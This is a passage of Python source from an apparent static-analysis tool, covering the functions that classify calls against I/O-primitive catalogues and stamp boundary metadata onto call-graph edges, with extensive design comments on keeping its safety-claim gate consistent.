    dst_ref: Optional[ExternalRef] = None,
) -> Optional[IoPrimitive]:
    """The I/O primitive this call reaches, or ``None`` if the catalogue has none.

    THE ONE ANSWER TO "DID THE CATALOGUE CLASSIFY THIS CALL", consumed by
    :func:`tag_io_boundaries` (which stamps the result onto the edge) and by
    ``verify_claims._uncatalogued_external_modules`` (which treats a classified
    call as EXAMINED). Those two were about to disagree, and the disagreement
    would have been a false safety claim in both directions at once.

    WHY THE COVERAGE GATE NEEDS THIS AND NOT A MODULE-LEVEL TEST. The gate asks
    whether "no chains found" is an examined negative. Its first form asked that
    per MODULE — is this module's I/O surface enumerated — and a module-level
    answer is wrong at both ends. It called ``os`` unexamined while the same run
    was classifying ``os.mkdir`` through it: measured, a fixture calling
    ``json.dump(obj, fh)`` printed *"calls into 2 module(s) with no I/O catalog
    coverage (builtins, json)"* directly above *"2 fs_write chain(s) found"* —
    chains found through those very modules. **A call the catalogue matched was
    examined; that is what examination IS.** The enumeration record is what
    settles the calls it did NOT match, which is a strictly smaller question.

    THE TWO CALLERS DIFFER ONLY IN WHAT THEY CAN SUPPLY, not in the rule. The
    tagger holds real ``Edge`` objects and passes ``dst_ref`` (the WI-tihup
    structured target) straight through; the gate holds serialized dicts and
    passes whatever ``dst_ref`` the map carried, falling back to the same
    ``_extract_callee_name`` / ``_extract_module_hint`` pair the tagger used
    before this function existed. ``call_construct``, ``io_mode``, the FFI
    pseudo-namespace redirect and the INV-sapit short-name withholding are
    shared verbatim, so a change to any of them moves both consumers together.
    """
    return classify_call_in_catalog(catalogs, dst, meta, dst_ref=dst_ref)[0]


def classify_call_in_catalog(
    catalogs: dict[str, IoBoundaryCatalog],
    dst: str,
    meta: Optional[dict[str, Any]] = None,
    *,
    dst_ref: Optional[ExternalRef] = None,
) -> tuple[Optional[IoPrimitive], Optional[IoBoundaryCatalog]]:
    """:func:`classify_call`, plus the CATALOGUE the match came from.

    Exists because a caller that needs to ask the catalogue a SECOND question
    about the same match — INV-zumin's "is this primitive simultaneously true
    of several boundaries" — would otherwise have to re-derive which catalogue
    the dst belongs to. That derivation is not ``dst.split(":")[0]``: it runs
    through :func:`_resolve_ffi_catalog`, so a cgo call into ``go:C:...`` is
    answered by the **C** catalogue. A second copy would get FFI edges wrong
    and would drift from this one the first time the redirect changed — the
    "second home for one fact" failure this module has paid for repeatedly.

    :func:`classify_call` is now a thin wrapper, so the two cannot disagree
    about what was matched.
    """
    lang = dst.split(":")[0]
    callee: Optional[str]
    module_hint: Optional[str]
    if dst_ref is not None:
        callee = dst_ref.name
        module_hint = dst_ref.module_path
    else:
        callee = _extract_callee_name(dst)
        module_hint = _extract_module_hint(dst)
    catalog, adjusted_hint = _resolve_ffi_catalog(lang, module_hint, catalogs)
    if catalog is None:
        return None, None
    edge_meta = meta or {}
    return catalog.lookup_with_module(
        callee, adjusted_hint,
        call_construct=edge_meta.get("call_construct"),
        io_mode=edge_meta.get("io_mode"),
        allow_short_name_fallback=not is_first_party_callable_dst(dst),
    ), catalog


def tag_io_boundaries(
    edges: list[Edge],
    catalogs: dict[str, IoBoundaryCatalog],
    *,
    call_types: frozenset[str] = frozenset({
        "calls", "imports",
        # INV-motos: A CONSTRUCTOR IS A CALL SITE, and the coverage gate has
        # said so since INV-buzab while this set did not. Its
        # ``_CALL_SITE_EDGE_TYPES`` carries ``instantiates`` — with a comment
        # justifying it, "a constructor is a genuine classification
        # opportunity" — so a constructor-shaped catalogued primitive was
        # counted EXAMINED by the gate and was structurally untaggable here,
        # and "no chains found" became ``confirmed``. Measured on the shipped
        # CLI with no overlay and no flags, claim
        # ``{boundary: subprocess, must_not_exist: true}``:
        # ``subprocess.Popen([...])`` returned ``confirmed`` rc 0 while the
        # control ``subprocess.run([...])`` returned ``violated`` rc 1 — same
        # claim, adjacent rows in one catalogue block, only the edge type
        # differing. 106 classified constructor calls were going untagged
        # across six repos (django 50, hypergumbo itself 27 including one
        # ``urllib.request.Request``, pretix 15, poetry 12, httpx 2, fastapi
        # 0), dominated by ``tempfile.TemporaryDirectory`` and
        # ``subprocess.Popen``. The subset property is now a parity test
        # (``test_the_gate_never_counts_an_edge_type_the_tagger_cannot_tag``)
        # so the next divergence fails rather than shipping a false all-clear.
        "instantiates",
        # WI-guhok: attribute-style IO primitives (os.environ, sys.argv, ...)
        # reach the boundary pipeline through module_attr_ref edges emitted by
        # the Python analyzer (and, per WI-gapam, eventually the tree-sitter
        # base class for JS/Java/Go/C/Rust).
        "module_attr_ref",
        # audit-findings 0002 (WI-hahap-farid): IPC family folds to event_publishes
        # (ipc_event, message_send, websocket_message, message_queue);
        # adding the canonical preserves I/O-boundary tracing across async
        # channel boundaries after the rename.
        "event_publishes",
        # FFI edges — trace I/O boundaries across language boundaries
        "wasm_bridge", "wasm_load", "bridge_invokes",
        "cgo_bridge", "ffi_bridge",
        "ipc_calls", "ipc_event",
        # Protocol-call family (WI-vumum-juvil) folds to canonical
        # 'calls' + meta['protocol']; HTTP/gRPC/GraphQL traversals
        # transfer via 'calls'. implements_rpc folded to 'implements' +
        # meta['protocol']='grpc' (audit-findings 0016) — matched by the
        # is_grpc_rpc_implementation predicate at the loop below, not a
        # set member.
    }),
) -> int:
    """Tag edges that reach I/O primitives with boundary metadata.

    For each call-type edge, extracts the callee name from the destination
    symbol ID, looks it up in the appropriate language catalog, and stamps
    ``io_boundary`` and ``io_primitive`` into ``edge.meta`` if matched.

    When the destination belongs to an FFI pseudo-namespace (e.g.,
    ``go:C:0-0:fopen:unresolved`` for cgo calls), the lookup is
    redirected to the actual target-language catalog (``c`` in this case)
    so C stdlib IO primitives are recognized even when the cgo linker
    could not resolve the call to a repo-local C symbol.

    Args:
        edges: List of Edge objects to scan (mutated in place).
        catalogs: Language → IoBoundaryCatalog mapping.
        call_types: Edge types to consider. Default includes calls,
            imports, and FFI edge types (wasm_bridge, ipc_calls, etc.)
            so boundary tracing crosses language boundaries.

    Returns:
        Number of edges tagged.
    """
    tagged = 0
    for edge in edges:
        if edge.edge_type not in call_types and not is_grpc_rpc_implementation(
            edge.edge_type, edge.meta
        ):
            continue

        # WI-tihup: prefer the structured ExternalRef when present.
        # ``getattr`` keeps MockEdge-style test doubles without the
        # attribute working.
        #
        # THE LOOKUP ITSELF LIVES IN :func:`classify_call`, not here. It used to
        # be inline, and the coverage gate in ``verify_claims`` then had to
        # decide the same question — "did the catalogue classify this call" —
        # with no way to reach this code. It answered a module-level
        # approximation instead and reported calls this loop had just tagged as
        # never examined. One question, one function.
        match, matched_catalog = classify_call_in_catalog(
            catalogs, edge.dst, getattr(edge, "meta", None),
            dst_ref=getattr(edge, "dst_ref", None),
        )
        if match is None or matched_catalog is None:
            continue

        if edge.meta is None:
            edge.meta = {}
        # INV-zumin / INV-virat. ``io_boundaries`` (the list) exists because
        # several facts about one call can be true at once, and a single slot
        # resolved by last-writer-wins silently loses all but one. TWO writers
        # can collide here:
        #
        #  * two CATALOGUE rows declared simultaneously true (INV-zumin —
        #    scala ``Process.apply`` is fs_write AND subprocess);
        #  * a PRODUCER stamp and a catalogue row (INV-virat — an analyzer
        #    stamped ``command_launch`` meaning "control leaves this process",
        #    and a row also describes the call, the way ``curl -> net_send``
        #    is right about the send and silent about the launch).
        #
        # The producer case keeps its stamp as the PRIMARY ``io_boundary``:
        # the analyzer SAW the launch, the catalogue merely ASSERTS the I/O,
        # and the opacity gate (INV-larol) keys on the stamp — before this,
        # the assignment below destroyed it, and the gate survived only
        # because it happened to read a different copy of the edge
        # (``_rehydrate_io_boundary_edges``'s shallow copy, made for WI-kumol
        # reasons). A safety property riding on an accidental copy is the
        # hole this closes; the read-order gate stays as a belt.
        #
        # ``io_boundaries`` stays ADDITIVE either way: absent for the ~99% of
        # edges with one fact, so a consumer that never learns the key
        # behaves exactly as before.
        simultaneous = matched_catalog.simultaneous_boundaries_for(
            match.qualified_name,
        )
        # INV-hazov: the three writes now route through the chokepoint, so
        # the "producer wins / catalogue refines / boundaries union" rules
        # live on the KEYS (axis_meta_keys.META_KEYS) rather than in this
        # branch. The branch that used to encode them is gone: keeping a
        # producer stamp is just what ``io_boundary``'s producer_primary
        # declaration MEANS, so there is no longer a second place to forget
        # it.
        existing = edge.meta.get("io_boundary")
        producer_stamp = (
            existing
            if isinstance(existing, str) and existing in PRODUCER_OPAQUE_BOUNDARIES
            else None
        )

        write_meta_key(edge.meta, "io_boundary", match.boundary)
        write_meta_key(edge.meta, "io_primitive", match.qualified_name)

        # ``io_boundaries`` stays ADDITIVE: written only when more than one
        # fact is true, so it is absent for the ~99% of edges with a single
        # fact and a consumer that never learns the key behaves exactly as
        # before. (This is why the call is conditional rather than
        # unconditional-with-an-empty-list.)
        extra = set(simultaneous)
        if producer_stamp is not None:
            extra |= {producer_stamp, match.boundary}
        if extra:
            write_meta_key(edge.meta, "io_boundaries", sorted(extra))
        tagged += 1

    return tagged
